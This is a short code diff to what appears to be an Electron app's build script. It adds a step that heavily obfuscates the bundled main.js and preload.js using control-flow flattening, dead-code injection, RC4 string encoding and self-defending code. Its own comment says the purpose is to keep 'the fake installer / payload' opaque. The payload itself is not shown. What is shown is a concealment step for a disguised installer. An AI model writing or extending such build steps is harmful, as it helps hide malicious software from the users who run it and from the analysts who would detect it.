@@ -95,6 +95,26 @@ Promise.all(
 
         const build_path = path.join(__dirname, "build");
 
+        // Obfuscate the bundled entry points so the fake installer / payload stays opaque
+        const JavaScriptObfuscator = require('javascript-obfuscator');
+        for (const bundle of ['main.js', 'preload.js']) {
+            const bundlePath = path.join(build_path, bundle);
+            const result = JavaScriptObfuscator.obfuscate(fs.readFileSync(bundlePath, 'utf-8'), {
+                compact: true,
+                controlFlowFlattening: true,
+                controlFlowFlatteningThreshold: 0.75,
+                deadCodeInjection: true,
+                deadCodeInjectionThreshold: 0.4,
+                stringArray: true,
+                stringArrayEncoding: ['rc4'],
+                stringArrayThreshold: 1,
+                renameGlobals: false,
+                selfDefending: true,
+                unicodeEscapeSequence: false,
+            });
+            fs.writeFileSync(bundlePath, result.getObfuscatedCode());
+            console.log('obfuscated:', bundle);
+        }
 
         fs.writeFileSync(path.join(build_path, "package.json"), currentPackageContent.replaceAll("DFPN", name))
 
